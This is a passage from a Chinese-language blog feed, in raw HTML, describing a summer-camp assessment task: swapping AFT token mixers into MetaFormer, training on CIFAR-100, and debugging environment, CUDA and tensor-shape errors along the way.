class="number">0.95</span> | area=medium | maxDets=<span class="number">100</span> ] = <span class="number">0.001</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= large | maxDets=<span class="number">100</span> ] = <span class="number">0.041</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">IoU metric: bbox</span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.000</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>      | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.001</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.75</span>      | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.000</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= small | maxDets=<span class="number">100</span> ] = <span class="number">0.000</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=medium | maxDets=<span class="number">100</span> ] = <span class="number">0.000</span></span><br><span class="line"> Average Precision  (AP) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= large | maxDets=<span class="number">100</span> ] = <span class="number">0.000</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets=  <span class="number">1</span> ] = <span class="number">0.003</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets= <span class="number">10</span> ] = <span class="number">0.012</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=   <span class="built_in">all</span> | maxDets=<span class="number">100</span> ] = <span class="number">0.027</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= small | maxDets=<span class="number">100</span> ] = <span class="number">0.000</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area=medium | maxDets=<span class="number">100</span> ] = <span class="number">0.002</span></span><br><span class="line"> Average Recall     (AR) @[ IoU=<span class="number">0.50</span>:<span class="number">0.95</span> | area= large | maxDets=<span class="number">100</span> ] = <span class="number">0.034</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 保研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 夏令营 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024年X-Team夏令营考核任务1</title>
      <link href="/2024/07/25/2024%E5%B9%B4X-Team%E5%A4%8F%E4%BB%A4%E8%90%A5%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A11/"/>
      <url>/2024/07/25/2024%E5%B9%B4X-Team%E5%A4%8F%E4%BB%A4%E8%90%A5%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A11/</url>
      
        <content type="html"><![CDATA[<h1 id="1-知识储备"><a href="#1-知识储备" class="headerlink" title="1 知识储备"></a>1 知识储备</h1><p>实现<code>aft-full/simple/conv</code>，用它们替换代码中的<a href="https://github.com/sail-sg/metaformer/blob/64c534ab8f65105fd21713b38e3393a449ca742d/metaformer_baselines.py#L484" title="tokenmixer">tokenmixer</a>部分，并做<code>cifar100</code>训练。</p><p>如果要替换代码中的token_mixer部分，需要首先实现<code>aft-full/simple/conv</code>。</p><h2 id="1-1-cifar100"><a href="#1-1-cifar100" class="headerlink" title="1.1 cifar100"></a>1.1 cifar100</h2><p><code>CIFAR100</code>数据集有100个类。每个类有600张大小为32 × 32的彩色图像，其中500张作为训练集，100张作为测试集。对于每一张图像，它有fine_labels和coarse_labels两个标签，分别代表图像的细粒度和粗粒度标签，对应下图中的<code>classes</code>和<code>superclass</code>。也就是说，<code>CIFAR100</code>数据集是层次的。</p><p><img src="/2024/07/25/2024%E5%B9%B4X-Team%E5%A4%8F%E4%BB%A4%E8%90%A5%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A11/image_UTEl8hrbrl.png"></p><h3 id="1-1-1-Top-1和Top-5"><a href="#1-1-1-Top-1和Top-5" class="headerlink" title="1.1.1 Top-1和Top-5"></a>1.1.1 Top-1和Top-5</h3><p>我们在训练完某个分类网络后，假设我们需要分类的数量为50类，我们需要评估它的分类性能。输入测试集的每张图片，会得到它的50个类别的的概率。</p><p><strong>Top-5准确率</strong>：在这张测试的图片50的类别中，取出概率最大的前五个类别，如果真实类别在这五个类别中，则预测正确，否则预测错误。</p><p>$$<br>top5_{Accuracy}&#x3D;\frac{真实类别在预测的5个类别中的数量}{所有测试集的数量}<br>$$</p><p><strong>Top-1准确率</strong>：平常我们评估预测的准确性指标</p><p>$$<br>top1_{Accuracy}&#x3D;\frac{预测正确的数量}{所有测试集的数量}<br>$$</p><p>而Top-5错误率与Top-1错误率恰好与top-5准确率和top-1准确率相反，他们的和为1。</p><h2 id="1-2-metaformer"><a href="#1-2-metaformer" class="headerlink" title="1.2 metaformer"></a>1.2 metaformer</h2><p>Transformer在计算机视觉任务中显示出了巨大的潜力。一个普遍的观念就是，基于注意力的<code>token mixer module</code>对Transformer的贡献最大。然而，最近的研究表明，Transformer中基于注意力的模块可以被<code>spatial MLPs</code>所取代，并且所得到的模型仍然表现得很好。</p><p>基于这一结果，作者假设，Transformer的一般架构对模型来说更为重要，而不是特定的<code>token mixer module</code>。为了验证这一假设，作者故意将Transformer中的注意力模块替换为简单空间池化操作，以便只进行最基本的<code>token mixer</code>。令人惊讶的是**<code>PoolFormer</code>**在多个计算机视觉任务上都取得了具有竞争力的性能。</p><p>例如，在<code>ImageNet-1K</code>上，<code>PoolFormer</code>达到了82.1%的Top-1精度，超过了DeiTB&#x2F;MLP-B240.3%&#x2F;1.1%，参数减少了35%&#x2F;52%，mac减少了48%&#x2F;60%。PoolFormer的有效性验证了作者的假设，并敦促启动<code>MetaFormer</code>的概念，这是一种从Transformer中抽象出来的一般架构，没有指定的<code>token mixer</code>。</p><p>基于大量的实验，作者认为<code>MetaFormer</code>是为最近的Transformer和类似<code>MLP</code>的视觉任务模型获得优越结果的关键。这项工作需要更多的未来研究，致力于改进<code>MetaFormer</code>，而不是专注于<code>token mixer module</code>。此外，作者提出的**<code>PoolFormer</code>**可以作为未来<code>MetaFormer</code>设计的Baseline。</p><p><img src="/2024/07/25/2024%E5%B9%B4X-Team%E5%A4%8F%E4%BB%A4%E8%90%A5%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A11/image_G0OlhSN0YT.png"></p><hr><h1 id="2-实现过程"><a href="#2-实现过程" class="headerlink" title="2 实现过程"></a>2 实现过程</h1><p>需要找一下怎么跑这个模型？<code>metaformer</code>的模型使用代码在哪个地方？</p><h2 id="2-1-遇到的问题"><a href="#2-1-遇到的问题" class="headerlink" title="2.1 遇到的问题"></a>2.1 遇到的问题</h2><h3 id="2-1-1-git-bash不能切换环境"><a href="#2-1-1-git-bash不能切换环境" class="headerlink" title="2.1.1 git bash不能切换环境"></a>2.1.1 git bash不能切换环境</h3><p>首先我尝试在git中修改使用的<code>conda</code>环境，输入命令后报错如下：</p><p><img src="/2024/07/25/2024%E5%B9%B4X-Team%E5%A4%8F%E4%BB%A4%E8%90%A5%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A11/image_LULvdmgYqF.png"></p><p>可能由于环境变量出现问题，参考网上一个帖子的做法，首先进入<code>..\Anaconda\etc\profile.d</code>目录下，在此打开git bash，然后输入以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;. &#x27;<span class="variable">$&#123;PWD&#125;</span>&#x27;/conda.sh&quot;</span> &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure><p>之后再次切换环境，如下图所示，切换成功。</p><p><img src="/2024/07/25/2024%E5%B9%B4X-Team%E5%A4%8F%E4%BB%A4%E8%90%A5%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A11/image_YOYbdpvk5s.png"></p><h3 id="2-1-2-bash运行使用的python程序不对"><a href="#2-1-2-bash运行使用的python程序不对" class="headerlink" title="2.1.2 bash运行使用的python程序不对"></a>2.1.2 bash运行使用的python程序不对</h3><p>运行实验的代码需要运行.sh脚本，然后使用bash命令，这个bash命令默认是git中的，而且执行时显示的路径为：<code>F:\env\gcc\msys64\mingw64\bin\python3.exe</code></p><p>发现问题了，原因在于在sh脚本中使用的python是默认的，如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">NUM_PROC=<span class="variable">$1</span></span><br><span class="line"><span class="built_in">shift</span></span><br><span class="line">python3 -m torch.distributed.launch --nproc_per_node=<span class="variable">$NUM_PROC</span> train.py <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将其中的<code>python3</code>修改为指定的python环境即可，修改后运行结果如下：</p><p><img src="/2024/07/25/2024%E5%B9%B4X-Team%E5%A4%8F%E4%BB%A4%E8%90%A5%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A11/image_Th_37px8AI.png"></p><p>虽然还是报错，但是起码能跑起来了。&#x20;</p><h3 id="2-1-3-local-rank参数报错"><a href="#2-1-3-local-rank参数报错" class="headerlink" title="2.1.3 local_rank参数报错"></a>2.1.3 local_rank参数报错</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> train.py: error: unrecognized arguments: --local-rank=0 </span><br><span class="line">E0710 10:43:26.383000 21308 torch\distributed\elastic\multiprocessing\api.py:826] failed (exitcode: 2) local_rank: 0 (pid: 16056) of binary: F:\anaconda\anaconda3\envs\DeltaZero\python.exe</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;F:\anaconda\anaconda3\envs\DeltaZero\lib\runpy.py&quot;</span>, line 196, <span class="keyword">in</span> _run_module_as_main</span><br><span class="line">    <span class="built_in">return</span> _run_code(code, main_globals, None,</span><br><span class="line">  File <span class="string">&quot;F:\anaconda\anaconda3\envs\DeltaZero\lib\runpy.py&quot;</span>, line 86, <span class="keyword">in</span> _run_code</span><br><span class="line">    <span class="built_in">exec</span>(code, run_globals)</span><br><span class="line">  File <span class="string">&quot;F:\anaconda\anaconda3\envs\DeltaZero\lib\site-packages\torch\distributed\launch.py&quot;</span>, line 198, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    main()</span><br><span class="line">  File <span class="string">&quot;F:\anaconda\anaconda3\envs\DeltaZero\lib\site-packages\torch\distributed\launch.py&quot;</span>, line 194, <span class="keyword">in</span> main</span><br><span class="line">    launch(args)</span><br><span class="line">  File <span class="string">&quot;F:\anaconda\anaconda3\envs\DeltaZero\lib\site-packages\torch\distributed\launch.py&quot;</span>, line 179, <span class="keyword">in</span> launch</span><br><span class="line">    run(args)</span><br><span class="line">  File <span class="string">&quot;F:\anaconda\anaconda3\envs\DeltaZero\lib\site-packages\torch\distributed\launcher\api.py&quot;</span>, line 132, <span class="keyword">in</span> __call__</span><br><span class="line">    <span class="built_in">return</span> launch_agent(self._config, self._entrypoint, list(args))</span><br><span class="line">  File <span class="string">&quot;F:\anaconda\anaconda3\envs\DeltaZero\lib\site-packages\torch\distributed\launcher\api.py&quot;</span>, line 263, <span class="keyword">in</span> launch_agent</span><br><span class="line">    raise ChildFailedError(</span><br><span class="line">torch.distributed.elastic.multiprocessing.errors.ChildFailedError:</span><br><span class="line">============================================================</span><br><span class="line">train.py FAILED</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">Failures:</span><br><span class="line">  &lt;NO_OTHER_FAILURES&gt;</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">Root Cause (first observed failure):</span><br><span class="line">[0]:</span><br><span class="line">  <span class="keyword">time</span>      : 2024-07-10_10:43:26</span><br><span class="line">  host      : DESKTOP-PIQBNCN</span><br><span class="line">  rank      : 0 (local_rank: 0)</span><br><span class="line">  exitcode  : 2 (pid: 16056)</span><br><span class="line">  error_file: &lt;N/A&gt;</span><br><span class="line">  traceback : To <span class="built_in">enable</span> traceback see: https://pytorch.org/docs/stable/elastic/errors.html</span><br><span class="line">============================================================</span><br></pre></td></tr></table></figure><p>报错的地方用红字体标出，可以看到由于一个未知的参数<code>--local-rank=0</code>，接下来找一下这个参数在哪传入的。</p><p>这个参数不能是用户自己设置的，应该是<code>pytorch</code>自动帮你填写。</p><p>在运行文件之前加入参数<code>--use_env</code>得以解决，如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NUM_PROC=1</span><br><span class="line"><span class="built_in">shift</span></span><br><span class="line">F:/anaconda/anaconda3/envs/DeltaZero/python -m torch.distributed.launch --nproc_per_node=<span class="variable">$NUM_PROC</span> --use_env train.py <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br></pre></td></tr></table></figure><h3 id="2-1-4-AssertionError-Torch-not-compiled-with-CUDA-enabled"><a href="#2-1-4-AssertionError-Torch-not-compiled-with-CUDA-enabled" class="headerlink" title="2.1.4 AssertionError: Torch not compiled with CUDA enabled"></a>2.1.4 AssertionError: Torch not compiled with CUDA enabled</h3><p>使用如下命令查看有否有可用的<code>cuda</code>，发现返回False。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="built_in">print</span>(torch.cuda.is_available())</span><br></pre></td></tr></table></figure><p>然后查看<code>conda</code>环境中的<code>pytorch</code>是CPU版本还是GPU版本，突然发现找不到<code>pytorch</code>包，但是我记得之前下过，有点尴尬。</p><p><img src="/2024/07/25/2024%E5%B9%B4X-Team%E5%A4%8F%E4%BB%A4%E8%90%A5%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A11/image_65AAyUHr8A.png"></p><p>所以需要下载<code>pytorch</code>包。</p><p><img src="/2024/07/25/2024%E5%B9%B4X-Team%E5%A4%8F%E4%BB%A4%E8%90%A5%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A11/image_jP8NnrGo-C.png"></p><p>安装完成之后，运行程序，上述报错解决。</p><h3 id="2-1-5-RuntimeError-Found-0-images-in-subfolders"><a href="#2-1-5-RuntimeError-Found-0-images-in-subfolders" class="headerlink" title="2.1.5 RuntimeError: Found 0 images in subfolders"></a>2.1.5 RuntimeError: Found 0 images in subfolders</h3><p>在创建数据集的时候出现了错误，完整报错如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">File <span class="string">&quot;D:\Code\Paper-code\metaformer\train.py&quot;</span>, line 572, <span class="keyword">in</span> main</span><br><span class="line">    dataset_train = create_dataset(</span><br><span class="line">  File <span class="string">&quot;F:\anaconda\anaconda3\envs\DeltaZero\lib\site-packages\timm\data\dataset_factory.py&quot;</span>, line 142, <span class="keyword">in</span> create_dataset</span><br><span class="line">    ds = ImageDataset(root, parser=name, class_map=class_map, load_bytes=load_bytes, **kwargs)</span><br><span class="line">  File <span class="string">&quot;F:\anaconda\anaconda3\envs\DeltaZero\lib\site-packages\timm\data\dataset.py&quot;</span>, line 32, <span class="keyword">in</span> __init__</span><br><span class="line">    parser = create_parser(parser or <span class="string">&#x27;&#x27;</span>, root=root, class_map=class_map)</span><br><span class="line">  File <span class="string">&quot;F:\anaconda\anaconda3\envs\DeltaZero\lib\site-packages\timm\data\parsers\parser_factory.py&quot;</span>, line 27, <span class="keyword">in</span> create_parser</span><br><span class="line">    parser = ParserImageFolder(root, **kwargs)</span><br><span class="line">  File <span class="string">&quot;F:\anaconda\anaconda3\envs\DeltaZero\lib\site-packages\timm\data\parsers\parser_image_folder.py&quot;</span>, line 73, <span class="keyword">in</span> __init__</span><br><span class="line">    raise RuntimeError(</span><br><span class="line">RuntimeError: Found 0 images <span class="keyword">in</span> subfolders of D:\Code\Paper-code\metaformer\cifar-100\train. Supported image extensions are .png, .jpg, .jpeg</span><br></pre></td></tr></table></figure><p>感觉这个应该是原来是使用<code>imagenet</code>进行训练，但是我换成了<code>cifar100</code>的原因。</p><p>手动将数据集换成了<code>cifar100</code>，使用<code>timm</code>库中的create_dataset可以自动进行下载，设置代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">args.dataset = <span class="string">&quot;torch/CIFAR100&quot;</span></span><br><span class="line">args.dataset_download = <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>运行结果如下，解决了上述报错问题。</p><p><img src="/2024/07/25/2024%E5%B9%B4X-Team%E5%A4%8F%E4%BB%A4%E8%90%A5%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A11/image_3fTF6CkbFb.png"></p><h3 id="2-1-6-ValueError-too-many-values-to-unpack-expected-3"><a href="#2-1-6-ValueError-too-many-values-to-unpack-expected-3" class="headerlink" title="2.1.6 ValueError: too many values to unpack (expected 3)"></a>2.1.6 ValueError: too many values to unpack (expected 3)</h3><p>数据集更换为<code>cifar100</code>后，运行程序，完整报错如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  File <span class="string">&quot;D:\Code\Paper-code\metaformer\train.py&quot;</span>, line <span class="number">792</span>, <span class="keyword">in</span> train_one_epoch</span><br><span class="line">    output = model(<span class="built_in">input</span>)</span><br><span class="line">  File <span class="string">&quot;F:\anaconda\anaconda3\envs\DeltaZero\lib\site-packages\torch\nn\modules\module.py&quot;</span>, line <span class="number">1501</span>, <span class="keyword">in</span> _call_impl</span><br><span class="line">    <span class="keyword">return</span> forward_call(*args, **kwargs)</span><br><span class="line">  File <span class="string">&quot;D:\Code\Paper-code\metaformer\metaformer_baselines.py&quot;</span>, line <span class="number">666</span>, <span class="keyword">in</span> forward</span><br><span class="line">    x = <span class="variable language_">self</span>.forward_features(x)</span><br><span class="line">  File <span class="string">&quot;D:\Code\Paper-code\metaformer\metaformer_baselines.py&quot;</span>, line <span class="number">662</span>, <span class="keyword">in</span> forward_features</span><br><span class="line">    x = <span class="variable language_">self</span>.stages[i](x)</span><br><span class="line">  File <span class="string">&quot;F:\anaconda\anaconda3\envs\DeltaZero\lib\site-packages\torch\nn\modules\module.py&quot;</span>, line <span class="number">1501</span>, <span class="keyword">in</span> _call_impl</span><br><span class="line">    <span class="keyword">return</span> forward_call(*args, **kwargs)</span><br><span class="line">  File <span class="string">&quot;F:\anaconda\anaconda3\envs\DeltaZero\lib\site-packages\torch\nn\modules\container.py&quot;</span>, line <span class="number">217</span>, <span class="keyword">in</span> forward</span><br><span class="line">    <span class="built_in">input</span> = module(<span class="built_in">input</span>)</span><br><span class="line">  File <span class="string">&quot;F:\anaconda\anaconda3\envs\DeltaZero\lib\site-packages\torch\nn\modules\module.py&quot;</span>, line <span class="number">1501</span>, <span class="keyword">in</span> _call_impl</span><br><span class="line">    <span class="keyword">return</span> forward_call(*args, **kwargs)</span><br><span class="line">  File <span class="string">&quot;D:\Code\Paper-code\metaformer\metaformer_baselines.py&quot;</span>, line <span class="number">522</span>, <span class="keyword">in</span> forward</span><br><span class="line">    <span class="variable language_">self</span>.token_mixer(<span class="variable language_">self</span>.norm1(x))</span><br><span class="line">  File <span class="string">&quot;F:\anaconda\anaconda3\envs\DeltaZero\lib\site-packages\torch\nn\modules\module.py&quot;</span>, line <span class="number">1501</span>, <span class="keyword">in</span> _call_impl</span><br><span class="line">    <span class="keyword">return</span> forward_call(*args, **kwargs)</span><br><span class="line">  File <span class="string">&quot;D:\Code\Paper-code\metaformer\aft\aft_full.py&quot;</span>, line <span class="number">17</span>, <span class="keyword">in</span> forward</span><br><span class="line">    batch_size, seq_len, _ = x.shape</span><br><span class="line">ValueError: too many values to unpack (expected <span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>从报错信息可以看出，应该是替换的<code>aft_full</code>模块的输入和真实数据的输入有偏差。</p><p>跑程序的时候显存都快占满了，希望电脑别崩。</p><p><img src="/2024/07/25/2024%E5%B9%B4X-Team%E5%A4%8F%E4%BB%A4%E8%90%A5%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A11/image_O-siT0kLNn.png"></p><p>可以将<code>aft_full</code>模块的输入打印出来看一下：</p><blockquote><p><code>x.shape: torch.Size([256, 56, 56, 64])</code></p></blockquote><p>现在需要弄明白这4个维度分别代表什么意思，应该从上一个模块的输出开始分析。</p><p>同时发现模型的初始输入的形状与上面相同，所以应该分析<code>data_loader</code>数据的形状。从其中取出的input的形状为<code>[256, 3, 224, 224]</code>，其中的224是什么来的？</p><ul><li>256：batch_size</li><li>56：数据增强之后的高</li><li>56：数据增强之后的宽</li><li>64：通道数</li></ul><h3 id="2-1-7-RuntimeError-FIND-was-unable-to-find-an-engine-to-execute-this-computation"><a href="#2-1-7-RuntimeError-FIND-was-unable-to-find-an-engine-to-execute-this-computation" class="headerlink" title="2.1.7 RuntimeError: FIND was unable to find an engine to execute this computation"></a>2.1.7 RuntimeError: FIND was unable to find an engine to execute this computation</h3><p>上面问题解决后，又出现了下面这个报错：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;D:\Code\Paper-code\metaformer\train.py&quot;</span>, line <span class="number">935</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    main()</span><br><span class="line">  File <span class="string">&quot;D:\Code\Paper-code\metaformer\train.py&quot;</span>, line <span class="number">709</span>, <span class="keyword">in</span> main</span><br><span class="line">    train_metrics = train_one_epoch(</span><br><span class="line">  File <span class="string">&quot;D:\Code\Paper-code\metaformer\train.py&quot;</span>, line <span class="number">790</span>, <span class="keyword">in</span> train_one_epoch</span><br><span class="line">    output = model(<span class="built_in">input</span>)</span><br><span class="line">  File <span class="string">&quot;F:\anaconda\anaconda3\envs\DeltaZero\lib\site-packages\torch\nn\modules\module.py&quot;</span>, line <span class="number">1501</span>, <span class="keyword">in</span> _call_impl</span><br><span class="line">    <span class="keyword">return</span> forward_call(*args, **kwargs)</span><br><span class="line">  File <span class="string">&quot;D:\Code\Paper-code\metaformer\metaformer_baselines.py&quot;</span>, line <span class="number">666</span>, <span class="keyword">in</span> forward</span><br><span class="line">    x = <span class="variable language_">self</span>.forward_features(x)</span><br><span class="line">  File <span class="string">&quot;D:\Code\Paper-code\metaformer\metaformer_baselines.py&quot;</span>, line <span class="number">661</span>, <span class="keyword">in</span> forward_features</span><br><span class="line">    x = <span class="variable language_">self</span>.downsample_layers[i](x)</span><br><span class="line">  File <span class="string">&quot;F:\anaconda\anaconda3\envs\DeltaZero\lib\site-packages\torch\nn\modules\module.py&quot;</span>, line <span class="number">1501</span>, <span class="keyword">in</span> _call_impl</span><br><span class="line">    <span class="keyword">return</span> forward_call(*args, **kwargs)</span><br><span class="line">  File <span class="string">&quot;D:\Code\Paper-code\metaformer\metaformer_baselines.py&quot;</span>, line <span class="number">210</span>, <span class="keyword">in</span> forward</span><br><span class="line">    x = <span class="variable language_">self</span>.conv(x)</span><br><span class="line">  File <span class="string">&quot;F:\anaconda\anaconda3\envs\DeltaZero\lib\site-packages\torch\nn\modules\module.py&quot;</span>, line <span class="number">1501</span>, <span class="keyword">in</span> _call_impl</span><br><span class="line">    <span class="keyword">return</span> forward_call(*args, **kwargs)</span><br><span class="line">  File <span class="string">&quot;F:\anaconda\anaconda3\envs\DeltaZero\lib\site-packages\torch\nn\modules\conv.py&quot;</span>, line <span class="number">463</span>, <span class="keyword">in</span> forward</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">self</span>._conv_forward(<span class="built_in">input</span>, <span class="variable language_">self</span>.weight, <span class="variable language_">self</span>.bias)</span><br><span class="line">  File <span class="string">&quot;F:\anaconda\anaconda3\envs\DeltaZero\lib\site-packages\torch\nn\modules\conv.py&quot;</span>, line <span class="number">459</span>, <span class="keyword">in</span> _conv_forward</span><br><span class="line">    <span class="keyword">return</span> F.conv2d(<span class="built_in">input</span>, weight, bias, <span class="variable language_">self</span>.stride,</span><br><span class="line">RuntimeError: FIND was unable to find an engine to execute this computation</span><br></pre></td></tr></table></figure><p>nvidia-smi 中的CUDA 版本与 nvcc不一致，nvidia-smi的结果显示CUDA版本是12.3，而从nvcc-V命令来看，却是CUDA 11.8。</p><p><img src="/2024/07/25/2024%E5%B9%B4X-Team%E5%A4%8F%E4%BB%A4%E8%90%A5%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A11/image_QFqCiWo-rj.png"></p><p><img src="/2024/07/25/2024%E5%B9%B4X-Team%E5%A4%8F%E4%BB%A4%E8%90%A5%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A11/image__LpiAkantD.png"></p><p>其实是因为CUDA 有两种API，分别是运行时 API 和 驱动API，即所谓的 Runtime API 与 Driver API。</p><ul><li><code>nvidia-smi</code> 的结果除了有 GPU 驱动版本型号，还有 <code>CUDA Driver API</code>的型号，这里是 12.3</li><li><code>nvcc</code>的结果是对应 <code>CUDA Runtime API</code></li></ul><table><thead><tr><th>命令</th><th><code>CUDA </code>API类型</th><th>显示</th><th>CUDA版本号例子</th><th>说明</th></tr></thead><tbody><tr><td>nvidia-smi</td><td>Driver API</td><td>GPU 驱动版本号；CUDA Driver API号</td><td>11.0</td><td></td></tr><tr><td>nvcc -V</td><td>Runtime API</td><td>CUDA Runtime API</td><td>10.0</td><td>安装python包（例如torch）需要匹配runtime cuda版本</td></tr></tbody></table><p>从网上查了相关资料，有的说可能由于<code>pytorch</code>版本过高，我的版本是2.0.1。将<code>pytorch 2.0.0</code>更改为<code>torch1.13.1+cu117</code>后解决。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install torch==1.13.1+cu117 torchvision==0.14.1+cu117 --extra-index-url https://download.pytorch.org/whl/cu117</span><br></pre></td></tr></table></figure><h3 id="2-1-8-RuntimeError-cuDNN-error-CUDNN-STATUS-INTERNAL-ERROR"><a href="#2-1-8-RuntimeError-cuDNN-error-CUDNN-STATUS-INTERNAL-ERROR" class="headerlink" title="2.1.8 RuntimeError: cuDNN error: CUDNN_STATUS_INTERNAL_ERROR"></a>2.1.8 RuntimeError: cuDNN error: CUDNN_STATUS_INTERNAL_ERROR</h3><p>上面那个错误解决之后，又报了下面这个错误，麻了😂：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">RuntimeError: cuDNN error: CUDNN_STATUS_INTERNAL_ERROR</span><br><span class="line">You can try to repro 